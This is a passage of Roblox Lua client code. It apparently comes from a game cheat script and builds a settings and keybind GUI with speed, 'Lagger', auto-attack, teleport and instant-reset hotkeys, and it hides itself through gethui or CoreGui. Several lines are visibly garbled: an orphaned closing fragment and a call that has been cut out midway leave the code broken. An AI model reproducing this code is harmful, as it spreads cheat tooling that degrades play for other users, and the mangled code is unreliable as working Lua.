local image=Instance.new("ImageLabel",b);image.Position=UDim2.new(0,4,0,4);image.Size=UDim2.new(1,-8,0,76);image.BackgroundColor3=COLORS.row2;image.BorderSizePixel=0;image.Image="rbxthumb://type=Asset&id="..tostring(item.Id).."&w=150&h=150";image.ScaleType=Enum.ScaleType.Fit;image.ZIndex=54;corner(image,6)
local label=Instance.new("TextLabel",b);label.Position=UDim2.new(0,4,0,82);label.Size=UDim2.new(1,-8,0,26);label.BackgroundTransparency=1;label.Text=item.Name or "Item";label.TextColor3=COLORS.white;label.Font=Enum.Font.GothamBold;label.TextSize=9;label.TextWrapped=true;label.TextTruncate=Enum.TextTruncate.AtEnd;label.ZIndex=54
b.Activated:Connect(function() AvatarChanger.setItem(category.name,category.assetTypes[1],item.Id,item.Name);closePicker() end)
end
local function load(query)
token=token+1;local mine=token;for _,child in ipairs(scroll:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end;status.Text="Loading...";pages=nil
}; ok = __m[1]; result = __m[2]; end
if mine~=token then return end
local items=nil
if ok and result then
local ok2, page1; do local __m = {pcall(function() return result:GetCurrentPage() end)}; ok2 = __m[1]; page1 = __m[2]; end
if ok2 and page1 and #page1>0 then pages=result;items=page1 end
end
if not items then
pages=nil
items=webSearchCatalog(category,query)
end
if mine~=token then return end
if not items then status.Text="Catalog unavailable - try again";return end
status.Text=(#items==0) and "No results" or ""
for _,item in ipairs(items) do card(item) end
end)
end
local debounce=0;search:GetPropertyChangedSignal("Text"):Connect(function() debounce=debounce+1;local mine=debounce;task.delay(0.45,function() if mine==debounce then load(search.Text) end end) end)
scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(function() if loading or not pages or pages.IsFinished then return end;if scroll.CanvasPosition.Y+scroll.AbsoluteSize.Y>=scroll.CanvasSize.Y.Offset-80 then loading=true;;if ok then for _,item in ipairs(pages:GetCurrentPage()) do card(item) end end;loading=false end) end end)
load("")
end
for i,category in ipairs(AVATAR_CATEGORIES) do
local row=Instance.new("Frame",body);row.Size=UDim2.new(1,0,0,rowH);row.BackgroundColor3=COLORS.row2;row.BackgroundTransparency=0.15;row.BorderSizePixel=0;row.LayoutOrder=i;corner(row,8);stroke(row,COLORS.strokeSoft,1,0.62)
local label=Instance.new("TextLabel",row);label.Position=UDim2.new(0,10,0,0);label.Size=UDim2.new(1,-128,1,0);label.BackgroundTransparency=1;label.Text=category.name;label.TextColor3=COLORS.white;label.Font=Enum.Font.GothamBold;label.TextSize=11;label.TextXAlignment=Enum.TextXAlignment.Left
local pick=Instance.new("TextButton",row);pick.Position=UDim2.new(1,-112,0.5,-12);pick.Size=UDim2.new(0,54,0,24);pick.BackgroundColor3=COLORS.row;pick.BorderSizePixel=0;pick.Text="PICK";pick.TextColor3=COLORS.white;pick.Font=Enum.Font.GothamBlack;pick.TextSize=10;pick.ZIndex=4;corner(pick,7);stroke(pick,COLORS.stroke,1,0.45);pick.Activated:Connect(function() openCatalog(category) end)
local pill, dot; do local __m = {mkPill(row,10)}; pill = __m[1]; dot = __m[2]; end;local function visual(on) animPill(pill,dot,on) end;AvatarChanger.uiRefresh[category.name]=visual;visual(avatarEntry(category.name).enabled)
local toggle=Instance.new("TextButton",pill);toggle.Size=UDim2.new(1,0,1,0);toggle.BackgroundTransparency=1;toggle.Text="";toggle.ZIndex=6;toggle.Activated:Connect(function() AvatarChanger.setEnabled(category.name,not avatarEntry(category.name).enabled) end)
end
local function setExpanded(on) expanded=on;arrow.Text=on and "▼" or "▶";body.Visible=on;TS:Create(wrap,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{Size=UDim2.new(1,0,0,on and (headerH+bodyH+6) or headerH)}):Play() end
local expand=Instance.new("TextButton",header);expand.Size=UDim2.new(1,0,1,0);expand.BackgroundTransparency=1;expand.Text="";expand.ZIndex=3;expand.Activated:Connect(function() setExpanded(not expanded) end)
end

end section(pageSYS, "Interface") do local row = mkRow(pageSYS, 34); mkLabel(row, "Hide UI") mkKB(row, KB.GuiHide, function(k, isGp) if isGp then KB.GuiHide.gp = k; KB.GuiHide.kb = nil else KB.GuiHide.kb = k; KB.GuiHide.gp = nil end; F.saveConfig() end) end section(pageSYS, "Appearance") do
local row = mkRow(pageSYS, 42); mkLabel(row, "Accent Color"); local picker = Instance.new("Frame"); picker.Name = "ColorThemePicker"; picker.Size = UDim2.new(0, 176, 0, 22); picker.Position = UDim2.new(1, -184, 0.5, -11); picker.BackgroundTransparency = 1; picker.ZIndex = 6; picker.Parent = row; local lay = Instance.new("UIListLayout"); lay.FillDirection = Enum.FillDirection.Horizontal; lay.Padding = UDim.new(0, 5); lay.VerticalAlignment = Enum.VerticalAlignment.Center; lay.HorizontalAlignment = Enum.HorizontalAlignment.Right; lay.SortOrder = Enum.SortOrder.LayoutOrder; lay.Parent = picker; local selectedPill = nil
for idx, preset in ipairs(THEME_PRESETS) do local btn = Instance.new("TextButton"); btn.Name = preset.name; btn.LayoutOrder = idx; btn.Size = UDim2.new(0, 16, 0, 16) btn.BackgroundColor3 = preset.color btn.BorderSizePixel = 0; btn.Text = ""; btn.AutoButtonColor = false; btn.ZIndex = 7; btn.Parent = picker; local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(1, 0); c.Parent = btn; local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(255, 255, 255); st.Thickness = 1.2; st.Transparency = 0.6; st.Parent = btn btn.MouseButton1Click:Connect(function() if selectedPill then
local os = selectedPill:FindFirstChildOfClass("UIStroke") if os then os.Transparency = 0.6; os.Thickness = 1.2 end TS:Create(selectedPill, TweenInfo.new(0.12), {Size = UDim2.new(0, 16, 0, 16)}):Play() end selectedPill = btn; st.Transparency = 0; st.Thickness = 2; TS:Create(btn, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Size = UDim2.new(0, 18, 0, 18)}):Play(); applyThemeColor(preset.color, preset.name) if bgAsset and bgAsset.Image ~= "" then bgAsset.ImageColor3 = Color3.new( 0.75 + preset.color.R * 0.25, 0.75 + preset.color.G * 0.25, 0.75 + preset.color.B * 0.25 ) end
pcall(function() F.saveConfig() end) end) if preset.name == (S.currentThemeName or currentThemeName) then selectedPill = btn; st.Transparency = 0; st.Thickness = 2; btn.Size = UDim2.new(0, 18, 0, 18) end end end do pcall(ensureBgAssets); local row = mkRow(pageSYS, 72); row.ClipsDescendants = false; mkLabel(row, "Background"); local gallery = Instance.new("ScrollingFrame"); gallery.Name = "BgGallery"
gallery.Size = UDim2.new(1, -110, 0, 52); gallery.Position = UDim2.new(0, 100, 0.5, -26); gallery.BackgroundColor3 = Color3.fromRGB(14, 14, 16); gallery.BackgroundTransparency = 0.25; gallery.BorderSizePixel = 0; gallery.ScrollBarThickness = 2; gallery.ScrollBarImageColor3 = COLORS.stroke; gallery.ScrollingDirection = Enum.ScrollingDirection.X; gallery.CanvasSize = UDim2.new(0, 0, 0, 0); gallery.AutomaticCanvasSize = Enum.AutomaticSize.X; gallery.ZIndex = 6; gallery.Parent = row
corner(gallery, 10); stroke(gallery, COLORS.stroke, 1, 0.7); local list = Instance.new("UIListLayout"); list.FillDirection = Enum.FillDirection.Horizontal; list.Padding = UDim.new(0, 6); list.VerticalAlignment = Enum.VerticalAlignment.Center list.SortOrder = Enum.SortOrder.LayoutOrder; list.Parent = gallery; local pad = Instance.new("UIPadding"); pad.PaddingLeft = UDim.new(0, 6); pad.PaddingRight = UDim.new(0, 6); pad.Parent = gallery; local selectedBg = nil for idx, preset in ipairs(BG_PRESETS) do
local thumb = Instance.new("ImageButton"); thumb.Name = "Bg_" .. preset.name; thumb.LayoutOrder = idx; thumb.Size = UDim2.new(0, 44, 0, 40); thumb.BackgroundColor3 = Color3.fromRGB(6,14,38); thumb.BorderSizePixel = 0; local resolvedThumb = resolveBgId(preset.id); thumb.Image = resolvedThumb; thumb.ImageTransparency = (resolvedThumb == "" and 1) or 0.1; thumb.ScaleType = Enum.ScaleType.Crop; thumb.ScaleType = Enum.ScaleType.Crop; thumb.AutoButtonColor = false; thumb.ZIndex = 7; thumb.Parent = gallery; corner(thumb, 8); local st = Instance.new("UIStroke"); st.Color = COLORS.stroke; st.Thickness = 1.2; st.Transparency = 0.45; st.Parent = thumb; st:SetAttribute("ThemeAccent", true); table.insert(themeAccentStrokes, st)
if preset.id == "" then local none = Instance.new("TextLabel"); none.Size = UDim2.new(1, 0, 1, 0); none.BackgroundTransparency = 1; none.Text = "NONE"; none.TextColor3 = COLORS.textDim; none.Font = Enum.Font.GothamBold; none.TextSize = 9; none.ZIndex = 8; none.Parent = thumb end thumb.MouseButton1Click:Connect(function() if selectedBg then local os = selectedBg:FindFirstChildOfClass("UIStroke") if os then os.Transparency = 0.45; os.Thickness = 1.2 end end selectedBg = thumb; st.Transparency = 0; st.Thickness = 2; applyBackground(preset.id) end)
if (S.currentBgId or currentBgId or "") == preset.id then selectedBg = thumb; st.Transparency = 0; st.Thickness = 2 end end end do
local row = mkRow(pageSYS, 34); mkLabel(row, "BG Intensity"); local minusBtn = Instance.new("TextButton", row); minusBtn.Size = UDim2.new(0, 28, 0, 24); minusBtn.Position = UDim2.new(1, -112, 0.5, -12); minusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); minusBtn.BorderSizePixel = 0; minusBtn.Text = "−"; minusBtn.TextColor3 = COLORS.white; minusBtn.Font = Enum.Font.GothamBold; minusBtn.TextSize = 16; minusBtn.ZIndex = 5; corner(minusBtn, 8); stroke(minusBtn, COLORS.stroke, 1, 0.75); local valLbl = Instance.new("TextLabel", row); valLbl.Size = UDim2.new(0, 44, 0, 24); valLbl.Position = UDim2.new(1, -80, 0.5, -12); valLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); valLbl.BackgroundTransparency = 0.15; valLbl.BorderSizePixel = 0; valLbl.Text = "58%"; valLbl.TextColor3 = COLORS.white; valLbl.Font = Enum.Font.GothamBold; valLbl.TextSize = 11; valLbl.ZIndex = 5; corner(valLbl, 8); local plusBtn = Instance.new("TextButton", row); plusBtn.Size = UDim2.new(0, 28, 0, 24); plusBtn.Position = UDim2.new(1, -32, 0.5, -12); plusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); plusBtn.BorderSizePixel = 0; plusBtn.Text = "+"; plusBtn.TextColor3 = COLORS.white; plusBtn.Font = Enum.Font.GothamBold; plusBtn.TextSize = 16; plusBtn.ZIndex = 5
corner(plusBtn, 8); stroke(plusBtn, COLORS.stroke, 1, 0.75); S.bgIntensity = S.bgIntensity or 0.58 local function setIntensity(v) S.bgIntensity = math.clamp(v, 0.15, 0.9); valLbl.Text = string.format("%d%%", math.floor(S.bgIntensity * 100 + 0.5)) if bgAsset and bgAsset.Image ~= "" then bgAsset.ImageTransparency = 1 - S.bgIntensity end if stealBarBgAsset and stealBarBgAsset.Image ~= "" then stealBarBgAsset.ImageTransparency = 1 - S.bgIntensity end pcall(function() F.saveConfig() end) end minusBtn.MouseButton1Click:Connect(function() setIntensity(S.bgIntensity - 0.08) end) plusBtn.MouseButton1Click:Connect(function() setIntensity(S.bgIntensity + 0.08) end) setIntensity(S.bgIntensity) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "GUI Size"); local minusBtn = Instance.new("TextButton", row); minusBtn.Size = UDim2.new(0, 28, 0, 24); minusBtn.Position = UDim2.new(1, -112, 0.5, -12); minusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); minusBtn.BackgroundTransparency = 0.1; minusBtn.BorderSizePixel = 0; minusBtn.Text = "−"; minusBtn.TextColor3 = COLORS.white; minusBtn.Font = Enum.Font.GothamBold; minusBtn.TextSize = 16; minusBtn.ZIndex = 5; corner(minusBtn, 8); stroke(minusBtn, COLORS.stroke, 1, 0.75); local scaleLbl = Instance.new("TextLabel", row); scaleLbl.Size = UDim2.new(0, 44, 0, 24); scaleLbl.Position = UDim2.new(1, -80, 0.5, -12); scaleLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); scaleLbl.BackgroundTransparency = 0.15; scaleLbl.BorderSizePixel = 0; scaleLbl.Text = "100%"; scaleLbl.TextColor3 = COLORS.white; scaleLbl.Font = Enum.Font.GothamBold; scaleLbl.TextSize = 11; scaleLbl.ZIndex = 5
corner(scaleLbl, 8); UI.guiScaleLbl = scaleLbl local plusBtn = Instance.new("TextButton", row); plusBtn.Size = UDim2.new(0, 28, 0, 24); plusBtn.Position = UDim2.new(1, -32, 0.5, -12); plusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); plusBtn.BackgroundTransparency = 0.1; plusBtn.BorderSizePixel = 0; plusBtn.Text = "+"; plusBtn.TextColor3 = COLORS.white; plusBtn.Font = Enum.Font.GothamBold; plusBtn.TextSize = 16; plusBtn.ZIndex = 5; corner(plusBtn, 8); stroke(plusBtn, COLORS.stroke, 1, 0.75) minusBtn.Activated:Connect(function() if S._anyKeyListening then return end
if _G._VersincApplyGuiScale then _G._VersincApplyGuiScale((_G._VersincGetGuiScale and _G._VersincGetGuiScale() or 1) - 0.1) end end) plusBtn.Activated:Connect(function() if S._anyKeyListening then return end if _G._VersincApplyGuiScale then _G._VersincApplyGuiScale((_G._VersincGetGuiScale and _G._VersincGetGuiScale() or 1) + 0.1) end end) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "Progress Bar Size"); local minusBtn = Instance.new("TextButton", row); minusBtn.Size = UDim2.new(0, 28, 0, 24); minusBtn.Position = UDim2.new(1, -112, 0.5, -12); minusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); minusBtn.BackgroundTransparency = 0.1; minusBtn.BorderSizePixel = 0; minusBtn.Text = "-"; minusBtn.TextColor3 = COLORS.white; minusBtn.Font = Enum.Font.GothamBold; minusBtn.TextSize = 16; minusBtn.ZIndex = 5; corner(minusBtn, 8); stroke(minusBtn, COLORS.stroke, 1, 0.75); local pbLbl = Instance.new("TextLabel", row); pbLbl.Size = UDim2.new(0, 44, 0, 24); pbLbl.Position = UDim2.new(1, -80, 0.5, -12); pbLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); pbLbl.BackgroundTransparency = 0.15; pbLbl.BorderSizePixel = 0; pbLbl.Text = tostring(S.progressBarScale or 100) .. "%"; pbLbl.TextColor3 = COLORS.white; pbLbl.Font = Enum.Font.GothamBold; pbLbl.TextSize = 11; pbLbl.ZIndex = 5
corner(pbLbl, 8); _G.__VersincProgressBarSizeLbl = pbLbl local plusBtn = Instance.new("TextButton", row); plusBtn.Size = UDim2.new(0, 28, 0, 24); plusBtn.Position = UDim2.new(1, -32, 0.5, -12); plusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); plusBtn.BackgroundTransparency = 0.1; plusBtn.BorderSizePixel = 0; plusBtn.Text = "+"; plusBtn.TextColor3 = COLORS.white; plusBtn.Font = Enum.Font.GothamBold; plusBtn.TextSize = 16; plusBtn.ZIndex = 5; corner(plusBtn, 8); stroke(plusBtn, COLORS.stroke, 1, 0.75) local function bump(d) if S._anyKeyListening then return end
local n = math.clamp((tonumber(S.progressBarScale) or 100) + d, 50, 200) if _G._VersincApplyProgressBarScale then _G._VersincApplyProgressBarScale(n) end pbLbl.Text = tostring(S.progressBarScale or n) .. "%"; F.saveConfig() end minusBtn.Activated:Connect(function() bump(-10) end) plusBtn.Activated:Connect(function() bump(10) end) end VS.setLockGuiVisual = mkToggle(pageSYS, "Lock GUI", function(on) S.guiLocked = on and true or false F.saveConfig() end) if S.autoSaveEnabled == nil then S.autoSaveEnabled = true end VS.setAutoSaveVisual = mkToggle(pageSYS, "Auto Save", function(on)
S.autoSaveEnabled = on and true or false F.saveConfig(true) end) do local row = mkRow(pageSYS, 28); local st = Instance.new("TextLabel", row); st.Size = UDim2.new(1, -12, 1, 0); st.Position = UDim2.new(0, 10, 0, 0); st.BackgroundTransparency = 1; st.Text = "Save: ready"; st.TextColor3 = COLORS.textDim; st.Font = Enum.Font.GothamMedium; st.TextSize = 11; st.TextXAlignment = Enum.TextXAlignment.Left; st.ZIndex = 5; UI.saveStatusLbl = st end task.defer(function() if VS.setAutoSaveVisual then VS.setAutoSaveVisual(S.autoSaveEnabled) end
if VS.setLockGuiVisual then VS.setLockGuiVisual(S.guiLocked) end end) section(pageSYS, "Mobile") VS.setMoveButtonsVisual = mkToggle(pageSYS, "Move Buttons", function(on) S.moveButtons = on and true or false S.lockMobileButtons = not S.moveButtons; F.saveConfig() end) VS.setLockMobileButtonsVisual = VS.setMoveButtonsVisual VS.setCircleButtonsVisual = mkToggle(pageSYS, "Circle Buttons", function(on) S.circleButtons = on and true or false; F.buildMobileButtons(); F.saveConfig() end) VS.setAllLockVisual = mkToggle(pageSYS, "All Lock Buttons", function(on) S.allLockButtons = on and true or false if S.allLockButtons then S.moveButtons = true; S.lockMobileButtons = false if VS.setMoveButtonsVisual then pcall(function() VS.setMoveButtonsVisual(true) end) end
end F.saveConfig() end) S.setAllLockVisual = VS.setAllLockVisual task.defer(function() if VS.setMoveButtonsVisual then VS.setMoveButtonsVisual(S.moveButtons == true) end if VS.setCircleButtonsVisual then VS.setCircleButtonsVisual(S.circleButtons == true) end if VS.setAllLockVisual then VS.setAllLockVisual(S.allLockButtons == true) end end) VS.setHideMobileVisual = mkToggle(pageSYS, "Hide Mobile Buttons", function(on) S.hideMobileButtons = on and true or false F.applyMobileButtonsHidden(); F.saveConfig() end) do
local row = mkRow(pageSYS, 34); mkLabel(row, "Mobile Buttons Size"); local minusBtn = Instance.new("TextButton", row); minusBtn.Size = UDim2.new(0, 28, 0, 24); minusBtn.Position = UDim2.new(1, -112, 0.5, -12); minusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); minusBtn.BorderSizePixel = 0; minusBtn.Text = "−"; minusBtn.TextColor3 = COLORS.white; minusBtn.Font = Enum.Font.GothamBold; minusBtn.TextSize = 16; minusBtn.ZIndex = 5
corner(minusBtn, 8); local sizeLbl = Instance.new("TextBox", row); sizeLbl.Size = UDim2.new(0, 44, 0, 24); sizeLbl.Position = UDim2.new(1, -80, 0.5, -12); sizeLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); sizeLbl.BorderSizePixel = 0; sizeLbl.ClearTextOnFocus = false; sizeLbl.TextXAlignment = Enum.TextXAlignment.Center
sizeLbl.Text = string.format("%.2f", S.mobileButtonScale or 0.80); sizeLbl.TextColor3 = COLORS.white; sizeLbl.Font = Enum.Font.GothamBold; sizeLbl.TextSize = 11; sizeLbl.ZIndex = 5; corner(sizeLbl, 8); UI.mobileSizeLbl = sizeLbl
sizeLbl.FocusLost:Connect(function() local v = tonumber(sizeLbl.Text); if v then S.mobileButtonScale = math.clamp(v, 0.30, 2.00); F.applyMobileButtonSize(); sizeLbl.Text = string.format("%.2f", S.mobileButtonScale); F.saveConfig() else sizeLbl.Text = string.format("%.2f", S.mobileButtonScale or 0.70) end end)
local plusBtn = Instance.new("TextButton", row); plusBtn.Size = UDim2.new(0, 28, 0, 24); plusBtn.Position = UDim2.new(1, -32, 0.5, -12); plusBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); plusBtn.BorderSizePixel = 0; plusBtn.Text = "+"; plusBtn.TextColor3 = COLORS.white; plusBtn.Font = Enum.Font.GothamBold; plusBtn.TextSize = 16; plusBtn.ZIndex = 5; corner(plusBtn, 8)
local function refreshSizeLbl() if UI.mobileSizeLbl then UI.mobileSizeLbl.Text = string.format("%.2f", S.mobileButtonScale or 0.80) end end minusBtn.Activated:Connect(function() S.mobileButtonScale = math.clamp((S.mobileButtonScale or 0.80) - 0.05, 0.30, 2.00) F.applyMobileButtonSize(); refreshSizeLbl(); F.saveConfig() end) plusBtn.Activated:Connect(function() S.mobileButtonScale = math.clamp((S.mobileButtonScale or 0.80) + 0.05, 0.30, 2.00) F.applyMobileButtonSize(); refreshSizeLbl(); F.saveConfig() end) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "Reset Mobile Buttons"); local resetBtn = Instance.new("TextButton", row); resetBtn.Size = UDim2.new(0, 72, 0, 24); resetBtn.Position = UDim2.new(1, -82, 0.5, -12); resetBtn.BackgroundColor3 = Color3.fromRGB(238, 238, 238); resetBtn.BorderSizePixel = 0; resetBtn.Text = "RESET"; resetBtn.TextColor3 = Color3.fromRGB(0, 0, 0); resetBtn.Font = Enum.Font.GothamBold; resetBtn.TextSize = 11; resetBtn.ZIndex = 5; corner(resetBtn, 8) resetBtn.Activated:Connect(function() F.resetMobileButtons()
if UI.mobileSizeLbl then UI.mobileSizeLbl.Text = string.format("%.2f", S.mobileButtonScale or 0.80) end if VS.setHideMobileVisual then VS.setHideMobileVisual(false) end end) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "Save Config"); local saveBtn = Instance.new("TextButton", row); saveBtn.Size = UDim2.new(0, 72, 0, 24); saveBtn.Position = UDim2.new(1, -82, 0.5, -12); saveBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); saveBtn.BackgroundTransparency = 0.1; saveBtn.BorderSizePixel = 0; saveBtn.Text = "SAVE"; saveBtn.TextColor3 = COLORS.white; saveBtn.Font = Enum.Font.GothamBold; saveBtn.TextSize = 11; saveBtn.ZIndex = 5; corner(saveBtn, 8); stroke(saveBtn, COLORS.stroke, 1, 0.75) saveBtn.Activated:Connect(function() if S._anyKeyListening then return end
saveBtn.Text = "..."; local ok = F.saveConfig(true) pcall(function() if F.saveMobileButtonsOnly then F.saveMobileButtonsOnly() end end) saveBtn.Text = ok and "SAVED" or "FAIL" if UI.saveStatusLbl then UI.saveStatusLbl.Text = ok and ("Saved " .. os.date("%H:%M:%S")) or "Save failed"; UI.saveStatusLbl.TextColor3 = ok and Color3.fromRGB(100, 220, 160) or Color3.fromRGB(255, 120, 120) end task.delay(1.4, function() if saveBtn and saveBtn.Parent then saveBtn.Text = "SAVE" end end) end) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "Reset All Configs"); local resetCfgBtn = Instance.new("TextButton", row); resetCfgBtn.Size = UDim2.new(0, 72, 0, 24); resetCfgBtn.Position = UDim2.new(1, -82, 0.5, -12); resetCfgBtn.BackgroundColor3 = Color3.fromRGB(238, 80, 80); resetCfgBtn.BackgroundTransparency = 0.05; resetCfgBtn.BorderSizePixel = 0; resetCfgBtn.Text = "RESET"; resetCfgBtn.TextColor3 = Color3.fromRGB(255, 255, 255); resetCfgBtn.Font = Enum.Font.GothamBold; resetCfgBtn.TextSize = 11; resetCfgBtn.ZIndex = 5; corner(resetCfgBtn, 8); stroke(resetCfgBtn, Color3.fromRGB(255, 140, 140), 1, 0.45)
resetCfgBtn.Activated:Connect(function() if S._anyKeyListening then return end resetCfgBtn.Text = "..."; local ok = F.resetAllConfig(); resetCfgBtn.Text = ok and "DONE" or "OK" task.delay(1.5, function() if resetCfgBtn and resetCfgBtn.Parent then resetCfgBtn.Text = "RESET" end end) end) end do
local row = mkRow(pageSYS, 28); local st = Instance.new("TextLabel", row); st.Size = UDim2.new(1, -12, 1, 0); st.Position = UDim2.new(0, 10, 0, 0); st.BackgroundTransparency = 1; st.Text = "Save: ready"; st.TextColor3 = COLORS.textDim; st.Font = Enum.Font.GothamMedium; st.TextSize = 11; st.TextXAlignment = Enum.TextXAlignment.Left; st.ZIndex = 5; UI.saveStatusLbl = st end task.defer(function() if UI.saveStatusLbl then UI.saveStatusLbl.Text = "Save: manual only"; UI.saveStatusLbl.TextColor3 = COLORS.textDim end end) lo = 0 section(pageKEYS, "Speed Keybinds")
do local row = mkRow(pageKEYS, 34); mkLabel(row, "Speed Key"); mkKB(row, KB.SpeedToggle, function(k, isGp) if isGp then KB.SpeedToggle.gp = k; KB.SpeedToggle.kb = nil else KB.SpeedToggle.kb = k; KB.SpeedToggle.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "Lagger Key"); mkKB(row, KB.LaggerToggle, function(k, isGp) if isGp then KB.LaggerToggle.gp = k; KB.LaggerToggle.kb = nil else KB.LaggerToggle.kb = k; KB.LaggerToggle.gp = nil end; F.saveConfig() end) end section(pageKEYS, "Combat Keybinds")
do local row = mkRow(pageKEYS, 34); mkLabel(row, "Auto Bat Key"); mkKB(row, KB.AutoBat, function(k, isGp) if isGp then KB.AutoBat.gp = k; KB.AutoBat.kb = nil else KB.AutoBat.kb = k; KB.AutoBat.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "TP Bat Key"); mkKB(row, KB.TPBat, function(k, isGp) if isGp then KB.TPBat.gp = k; KB.TPBat.kb = nil; TP_BAT_CONTROLLER = k else KB.TPBat.kb = k; KB.TPBat.gp = nil; TP_BAT_KEY = k end F.saveConfig() end) end
do local row = mkRow(pageKEYS, 34); mkLabel(row, "Anti TP Bat Key"); mkKB(row, KB.AntiTPBat, function(k, isGp) if isGp then KB.AntiTPBat.gp = k; KB.AntiTPBat.kb = nil else KB.AntiTPBat.kb = k; KB.AntiTPBat.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "Bat V2 Key"); mkKB(row, KB.BatV2, function(k, isGp) if isGp then KB.BatV2.gp = k; KB.BatV2.kb = nil else KB.BatV2.kb = k; KB.BatV2.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "Insta Reset Key"); mkKB(row, KB.InstaReset, function(k, isGp) if isGp then KB.InstaReset.gp = k; KB.InstaReset.kb = nil else KB.InstaReset.kb = k; KB.InstaReset.gp = nil end; F.saveConfig() end) end section(pageKEYS, "Movement Keybinds") do local row = mkRow(pageKEYS, 34); mkLabel(row, "Auto Left Key"); mkKB(row, KB.AutoLeft, function(k, isGp) if isGp then KB.AutoLeft.gp = k; KB.AutoLeft.kb = nil else KB.AutoLeft.kb = k; KB.AutoLeft.gp = nil end; F.saveConfig() end) end
do local row = mkRow(pageKEYS, 34); mkLabel(row, "Auto Right Key"); mkKB(row, KB.AutoRight, function(k, isGp) if isGp then KB.AutoRight.gp = k; KB.AutoRight.kb = nil else KB.AutoRight.kb = k; KB.AutoRight.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "Drop Key"); mkKB(row, KB.DropBrainrot, function(k, isGp) if isGp then KB.DropBrainrot.gp = k; KB.DropBrainrot.kb = nil else KB.DropBrainrot.kb = k; KB.DropBrainrot.gp = nil end; F.saveConfig() end) end
do local row = mkRow(pageKEYS, 34); mkLabel(row, "TP Down Key"); mkKB(row, KB.TPFloor, function(k, isGp) if isGp then KB.TPFloor.gp = k; KB.TPFloor.kb = nil else KB.TPFloor.kb = k; KB.TPFloor.gp = nil end; F.saveConfig() end) end do local row = mkRow(pageKEYS, 34); mkLabel(row, "Hide UI Key"); mkKB(row, KB.GuiHide, function(k, isGp) if isGp then KB.GuiHide.gp = k; KB.GuiHide.kb = nil else KB.GuiHide.kb = k; KB.GuiHide.gp = nil end; F.saveConfig() end) end UIS.InputBegan:Connect(function(input, gpe) if S._anyKeyListening then return end if input.UserInputType == Enum.UserInputType.Keyboard then
if gpe or UIS:GetFocusedTextBox() then return end elseif not isGamepadInput(input) then return end if not isBindableInput(input) then return end local kc = input.KeyCode if kbMatch(KB.LaggerToggle, kc) then F.toggleLaggerMode(); F.saveConfig() elseif kbMatch(KB.SpeedToggle, kc) then F.toggleCarryMode(); F.saveConfig() elseif kbMatch(KB.DropBrainrot, kc) then F.runDrop() elseif kbMatch(KB.TPFloor, kc) then F.runTPFloor() elseif kbMatch(KB.InstaReset, kc) then if _G.ZombieFireInstaReset then _G.ZombieFireInstaReset() end elseif kbMatch(KB.AntiTPBat, kc) then if AntiTPBat and AntiTPBat.toggle then AntiTPBat.toggle() end elseif kbMatch(KB.AutoLeft, kc) then S.autoLeftEnabled = not S.autoLeftEnabled
if S.autoLeftEnabled then F.queueAutoLeftStart() else F.stopAutoLeft() end if S.autoLeftSetVisual then S.autoLeftSetVisual(S.autoLeftEnabled) end elseif kbMatch(KB.AutoRight, kc) then S.autoRightEnabled = not S.autoRightEnabled if S.autoRightEnabled then F.queueAutoRightStart() else F.stopAutoRight() end if S.autoRightSetVisual then S.autoRightSetVisual(S.autoRightEnabled) end elseif kbMatch(KB.AutoBat, kc) then if not S.autoBatEnabled then F.queueAutoBatStart() if S.autoBatSetVisual then S.autoBatSetVisual(true) end else S.autoBatEnabled = false; S.disableAutoBat()
if S.autoBatSetVisual then S.autoBatSetVisual(false) end end elseif kbMatch(KB.BatV2, kc) then if F.toggleBatV2 then F.toggleBatV2() end F.saveConfig() elseif kbMatch(KB.TPBat, kc) then setTPBatState(not tpBatEnabled) elseif kbMatch(KB.GuiHide, kc) then if main.Visible then hideGui() else showGui() end end end) do
local ibGui = Instance.new("ScreenGui")
ibGui.Name = "ZombieVSInfoBar"
F.registerWaveThemeRoot(ibGui)
ibGui.ResetOnSpawn = false
ibGui.IgnoreGuiInset = true
ibGui.DisplayOrder = 2147483646
ibGui.Enabled = true
ibGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local okp = pcall(function() if gethui then ibGui.Parent = gethui() end end)
if not ibGui.Parent then pcall(function() ibGui.Parent = game:GetService("CoreGui") end) end
if not ibGui.Parent then ibGui.Parent = LP:WaitForChild("PlayerGui") end

-- Barra Wave: somente apresentação; progresso real continua ligado ao MysteryGrab do Zombie.
local WAVE_BAR = {bg=Color3.fromRGB(8,12,28), border=Color3.fromRGB(20,60,140), ink=Color3.fromRGB(30,100,220), track=Color3.fromRGB(20,35,60)}
